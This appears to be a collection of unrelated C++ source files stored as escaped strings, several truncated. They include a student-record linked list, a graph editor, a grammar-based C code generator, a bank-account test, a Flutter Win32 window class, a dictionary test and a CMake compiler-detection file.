1.e : move the current to the noext node\n\t\t}\n\n\t\tnewNode->next = current; // step 1: Make the next field of the new node point to current.\n\t\tnewNode->prev = previous; // step 5: Make the previous field of the new node point to previous.\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode; // step 6: Make the previous field of the current node point to the new node\n\t\t}\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode; // step 7: Make the next fieldof the previous node point to the new node.\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// if previous is still NULL, its means newNode is now the first node\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\n\nbool search(int rollNo, Node **previous,  Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; //\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // 3: get the roll number to be deleted\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // step 1 : start from the first node\n\tprevious = NULL;\n\n\t// locate the node to be deleted\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node\n\tif (current == START)\n\t{\n\t\tSTART = START->next; // step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL; // step\n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first Node\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{ // if there's a succesor, update its prev pointer\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\tNode* currentNode = START;\n\twhile (currentNode != NULL)\n\t{\n\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\n\n\nint main()\n{\n\n}\n\n\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <unordered_map>\n#include <fstream>\n#include <filesystem>\n#include <sstream>\n#include <queue>\n\n\n#define VERSION \"1.1.0\"\n\n#if defined(_WIN32) || defined(_WIN64) || \\\n    defined(__WIN32__) || defined(__TOS_WIN__) || \\\n    defined(__WINDOWS__)\n#    define ENV \"windows\"\n#    define Windows\n#elif defined(linux) || defined(__linux) || \\\n    defined(__linux__) || defined(__gnu_linux__)\n#    define ENV \"linux\"\n#elif defined(macintosh) || defined(Macintosh) || \\\n    (defined(__APPLE__) && defined(__MACH__))\n#    define ENV \"macos\"\n#else\n#    error Unsupported OS\n#endif\n\n#if defined(__x86_64__) || defined(_M_X64)\n#define ARC \"x86_64\"\n#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)\n#define ARC \"x86_32\"\n#else\n#define ARC \"arm\"\n#endif\n\n\nstruct Node;\n\nstruct Edge {\n    size_t indx_to;\n    size_t indx_from;\n    float cost;\n};\n\nstruct Node {\n    std::string name;\n    std::vector<Edge> edge;\n};\n\n\ninline int convertToInt(const std::string& str) {\n    return *(reinterpret_cast<const int*>(str.c_str()));\n}\n\ninline void interupted() {\n    std::cout << \"interrupted\\n\";\n}\n\n\nstd::unordered_map<std::string, size_t> name_map;\nstd::vector<Node> graph;\nsize_t nod_origin_index = 0;\nstd::string inp = \"\";\n\nbool debug_flag = false;\nbool argument_flag = false;\n\n\nstd::queue<std::string> arg_input_queue;\n\n\nvoid inputNodeName() {\n    if (argument_flag) {\n        inp = arg_input_queue.front();\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"name: \";\n        std::getline(std::cin >> std::ws, inp);\n    }\n}\n\n\nvoid fNewPoint() {\n    inputNodeName();\n\n    Node nd;\n    nd.name = inp;\n    name_map.insert(std::make_pair(inp, graph.size()));\n\n    graph.push_back(nd);\n}\n\n\nsize_t getNode() {\n    auto iter = name_map.begin();\n\n    if (!argument_flag) {\n        auto not_inter = true;\n        do {\n            inputNodeName();\n\n            if (inp.empty())\n                not_inter = false;\n            else\n                iter = name_map.find(inp);\n\n        } while (not_inter && (iter == name_map.end() || iter->second == nod_origin_index));\n\n        return not_inter\n            ? iter->second\n            : -1;\n    } else {\n        inputNodeName();\n        iter = name_map.find(inp);\n\n        return !(iter == name_map.end() || iter->second == nod_origin_index)\n            ? iter->second\n            : -1;\n    }\n}\n\n\nvoid embedEdge(Edge& edg) {\n    if (argument_flag) {\n        edg.cost = std::stof(arg_input_queue.front());\n        arg_input_queue.pop();\n    } else {\n        std::cout << \"cost: \";\n        std::cin >> edg.cost;\n    }\n\n    graph[edg.indx_from].edge.push_back(edg);\n    graph[edg.indx_to].edge.push_back(edg);\n}\n\nvoid giveChoiceUseNameAsIndex() {\n    if (argument_flag) {\n        inp = (arg_input_queue.front()[0] == 'n') ? \"Y\" : \"n\";\n    } else {\n        std::cout << \"use name as index(Y/n): \";\n        std::cin >> inp;\n    }\n}\n\nvoid fNewEdge() {\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if ((edg.indx_to = getNode()) == -1) { interupted(); return; }\n\n        embedEdge(edg);\n    } else if (inp[0] == 'n') {\n        Edge edg;\n        edg.indx_from = nod_origin_index;\n\n        if (argument_flag) {\n            edg.indx_to = std::stoi(arg_input_queue.front());\n            arg_input_queue.pop();\n\n            if (edg.indx_to >= graph.size() && edg.indx_to == nod_origin_index) {\n                std::cout << \"index is out of range\\n\";\n                exit(1);\n            }\n        }\n        else\n            while ((std::cin >> edg.indx_to, edg.indx_to) >= graph.size() && edg.indx_to == nod_origin_index);\n\n        embedEdge(edg);\n    }\n}\n\n\nvoid fList() {\n    if (graph.empty()) return;\n\n    auto& cur = graph[nod_origin_index];\n\n    size_t nod_to;\n\n    std::cout << cur.name << \":\\n\";\n    for (size_t i = 0; i < cur.edge.size(); i++) {\n        nod_to = ((cur.edge[i].indx_from == nod_origin_index)\n            ? cur.edge[i].indx_to\n            : cur.edge[i].indx_from);\n\n        std::cout << '\\t';\n\n        if (nod_to >= graph.size()) std::cout << \"invl \" << nod_to;\n        else std::cout << graph[nod_to].name;\n\n        std::cout << \" -> \" << cur.edge[i].cost << '\\n';\n    }\n\n}\n\n\nvoid fListAll() {\n    size_t old_origin = nod_origin_index;\n    std::cout << \"Size: \" << graph.size() << \" nodes\\n\";\n    for (size_t i = 0; i < graph.size(); i++) {\n        nod_origin_index = i;\n        fList();\n    }\n}\n\n\nvoid fSetOrigin() {\n    if (graph.size() == 1) nod_origin_index = 0;\n    if (graph.size() < 2) return;\n\n    giveChoiceUseNameAsIndex();\n\n    if (inp[0] == 'Y') {\n        if ((nod_origin_index = getNode()) == -1) {\n            interupted();\n            nod_origin_index = 0;\n            return;\n        }\n    } else if (inp[0] == 'n') {\n        if (argument_flag) {\n            nod_origin_index = std::stoi(arg_input_queue.front());\n            arg_input",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if (this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\nvoid compile(string file, bool show)\n    {\n        string code = R\"(#include<stdio.h>\n#include<string.h>\n#include<time.h>\n#include<stdlib.h>\n#define next(l)\\\n    seed ^= seed <<13;\\\n    seed ^= seed >>17;\\\n    seed ^= seed <<5;\\\n    branch = seed%l\n\n\n#define BUFFER_SIZE 512*1024*1024\n\n#define extend(c)\\\n    (buffer).data[(buffer).top++] = c;\n\n#define clean()\\\n    buffer.top = 0\n     \n#define printbuff()\\\n    for (int i = 0; i < (buffer).top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n')\n    \ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\nBuffer buffer;\n\nunsigned branch;\nunsigned cursor;\nunsigned seed;\n)\";\n        code += \"#define MAXDEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        // creat signature\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            code += \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth);\\n\";\n        }\n\n        string functions = \"\";\n        for (int i = 0; i < this->nodes.size(); i++)\n        {\n            string function = \"\";\n            string functionname = \"void func_\" + to_string(reinterpret_cast<uintptr_t>(mp[nodes[i]->name])) + \"(unsigned depth){\\n\";\n            string body = \"\";\n            if (nodes[i]->tp == Type::terminal)\n            {\n                for (int j = 0; j < nodes[i]->name.size(); j++)\n                {\n                    body += \"    extend(\" + to_string((unsigned)nodes[i]->name[j]) + \");\\n\";\n                }\n            }\n            else if (nodes[i]->tp == Type::non_terminal)\n            {\n                body += \"    if(depth>MAXDEPTH){\\n\";\n                for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                {\n                    body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                }\n                body += \"        return;\\n\";\n                body += \"    }\\n\";\n                body += \"    next(\" + to_string(nodes[i]->subnode.size()) + \");\\n\";\n                body += \"    switch(branch){\\n\";\n                for (int j = 0; j < nodes[i]->subnode.size(); j++)\n                {\n                    body += \"       case \" + to_string(j) + \":\\n\";\n                    body += \"           func_\" + to_string(reinterpret_cast<uintptr_t>(nodes[i]->subnode[j])) + \"(depth+1);\\n           break;\\n\";\n                }\n                body += \"    }\\n\";\n            }\n            else if (nodes[i]->tp == Type::expression)\n            {\n                // body += \"    if(depth>MAXDEPTH){\\n\";\n                // for (int j = 0; j < shortcut[nodes[i]].size(); j++)\n                // {\n                //     body += \"        extend(\" + to_string((unsigned)shortcut[nodes[i]][j]) + \");\\n\";\n                // }\n                // body += \"        return;\\n\";\n                // body += \"    }\\n\";\n             ",
    "// ************************************************************************** //\n//                                                                            //\n//                tests.cpp for GlobalBanksters United                        //\n//                Created on  : Thu Nov 20 23:45:02 1989                      //\n//                Last update : Wed Jan 04 09:23:52 1992                      //\n//                Made by : Brad \"Buddy\" McLane <bm@gbu.com>                  //\n//                                                                            //\n// ************************************************************************** //\n\n#include <vector>\n#include <algorithm>\n#include <functional>\n#include \"Account.hpp\"\n\n\nint\t\tmain( void ) {\n\n\ttypedef std::vector<Account::t>\t\t\t\t\t\t\t  accounts_t;\n\ttypedef std::vector<int>\t\t\t\t\t\t\t\t  ints_t;\n\ttypedef std::pair<accounts_t::iterator, ints_t::iterator> acc_int_t;\n\n\tint\tconst\t\t\t\tamounts[]\t= { 42, 54, 957, 432, 1234, 0, 754, 16576 };\n\tsize_t const\t\t\tamounts_size( sizeof(amounts) / sizeof(int) );\n\taccounts_t\t\t\t\taccounts( amounts, amounts + amounts_size );\n\taccounts_t::iterator\tacc_begin\t= accounts.begin();\n\taccounts_t::iterator\tacc_end\t\t= accounts.end();\n\n\tint\tconst\t\t\td[]\t\t\t= { 5, 765, 564, 2, 87, 23, 9, 20 };\n\tsize_t const\t\td_size( sizeof(d) / sizeof(int) );\n\tints_t\t\t\t\tdeposits( d, d + d_size );\n\tints_t::iterator\tdep_begin\t= deposits.begin();\n\tints_t::iterator\tdep_end\t\t= deposits.end();\n\n\tint\tconst\t\t\tw[]\t\t\t= { 321, 34, 657, 4, 76, 275, 657, 7654 };\n\tsize_t const\t\tw_size( sizeof(w) / sizeof(int) );\n\tints_t\t\t\t\twithdrawals( w, w + w_size );\n\tints_t::iterator\twit_begin\t= withdrawals.begin();\n\tints_t::iterator\twit_end\t\t= withdrawals.end();\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\tfor ( acc_int_t it( acc_begin, dep_begin );\n\t\t  it.first != acc_end && it.second != dep_end;\n\t\t  ++(it.first), ++(it.second) ) {\n\n\t\t(*(it.first)).makeDeposit( *(it.second) );\n\t}\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\tfor ( acc_int_t it( acc_begin, wit_begin );\n\t\t  it.first != acc_end && it.second != wit_end;\n\t\t  ++(it.first), ++(it.second) ) {\n\n\t\t(*(it.first)).makeWithdrawal( *(it.second) );\n\t}\n\n\tAccount::displayAccountsInfos();\n\tstd::for_each( acc_begin, acc_end, std::mem_fun_ref( &Account::displayStatus ) );\n\n\treturn 0;\n}\n\n\n// ************************************************************************** //\n// vim: set ts=4 sw=4 tw=80 noexpandtab:                                      //\n// -*- indent-tabs-mode:t;                                                   -*-\n// -*- mode: c++-mode;                                                       -*-\n// -*- fill-column: 75; comment-column: 75;                                  -*-\n// ************************************************************************** //\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n\u7528\u4e8e\u6d4b\u8bd5\u8bcd\u5178\uff0c\u53ef\u6839\u636e\u4e2a\u4eba\u9700\u8981\u81ea\u884c\u4fee\u6539\u8be5\u6587\u4ef6\u8fdb\u884c\u6d4b\u8bd5\n*/\n\n#include\"Dictionary.h\"\nusing namespace std;\nDictionary dictionary1,dictionary2;\n\nint main(){\n    //\u5b57\u5178\u5408\u5e76\n    cout << \"\u5408\u5e76\uff1a\\n\";\n    load(dictionary1,\"1.txt\");\n    cout << \"dictionary1::\\n\";\n    for(auto it = dictionary1.begin();it!=dictionary1.end();++it){\n        cout << \"[\" << it->first << \" \" << it->second << \"]\\n\";\n    }\n    cout << \"\\n\";\n    load(dictionary2,\"2.txt\");\n    cout << \"dictionary2::\\n\";\n    for(auto it = dictionary2.begin();it!=dictionary2.end();++it){\n        cout << \"[\" << it->first << \" \" << it->second << \"]\\n\";\n    }\n    dictionary1.merge(dictionary2);\n    cout << \"\\n\";\n\tcout << \"      \u82f1\u6c49\u8bcd\u5178\\n\";\n    cout << \"      \u67e5\u770b\u53ef\u7528\u547d\u4ee4:help\\n\";\n\twhile(1){\n\t\tcout << \"\\n\";\n        cout << \"\\n\";\n        string op;\n        cin >> op;\n        if(op[0]=='1'){\n        \tstring word,meaning;\n        \tcin >> word >> meaning;\n        \tdictionary1.insert(word,meaning);\n        \tcout << \"ok\\n\";\n        }else if(op[0]=='2'){\n        \tstring word;\n        \tcin >> word;\n        \tdictionary1.erase(word);\n        \tcout << \"ok\\n\";\n        }else if(op[0]=='3'){\n        \tstring word;\n        \tcin >> word;\n        \tauto it = dictionary1.find(word);\n        \tif(it==nullptr){\n        \t\tcout << \"Not Found\\n\";\n        \t}else{\n        \t\tcout << \"[\" << it->first << \" \" << it->second << \"]\\n\";\n        \t}\n        }else if(op[0]=='4'){\n            for(auto it = dictionary1.begin();it!=dictionary1.end();++it){\n                cout << \"[\" << it->first << \" \" << it->second << \"]\\n\";\n            }\n        }else if(op==\"help\"){\n            cout << \"1 \u5355\u8bcd \u6c49\u8bed\u610f\u601d (\u63d2\u5165\u5355\u8bcd)\\n\";\n            cout << \"2 \u5355\u8bcd (\u5220\u9664\u5355\u8bcd)\\n\";\n            cout << \"3 \u5355\u8bcd (\u67e5\u8be2\u5355\u8bcd\u610f\u601d)\\n\";\n            cout << \"4 \u6309\u7167\u5b57\u5178\u5e8f\u663e\u793a\u5b57\u5178\u4e2d\u6240\u6709\u5355\u8bcd\\n\";\n            cout << \"load xxx.txt \u4ece\u8be5\u6587\u672c\u6587\u4ef6\u4e2d\u52a0\u8f7d\u8bcd\u5178\\n\";\n            cout << \"save xxx.txt \u4ece\u8be5\u6587\u672c\u6587\u4ef6\u4e2d\u52a0\u8f7d\u8bcd\u5178\\n\";\n        }else if(op==\"load\"){\n            string fileName;\n            cin >> fileName;\n            load(dictionary1,fileName);\n            cout << \"\u52a0\u8f7d\u6210\u529f\u3002\\n\";\n        }else if(op==\"save\"){\n            string fileName;\n            cin >> fileName;\n            save(dictionary1,fileName);\n            cout << \"\u4fdd\u5b58\u6210\u529f\u3002\\n\";\n        }else{\n        \tcout << \"\u547d\u4ee4\u683c\u5f0f\u9519\u8bef\u3002\\n\";\n        }\n\t}\n\treturn 0;\n}",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = 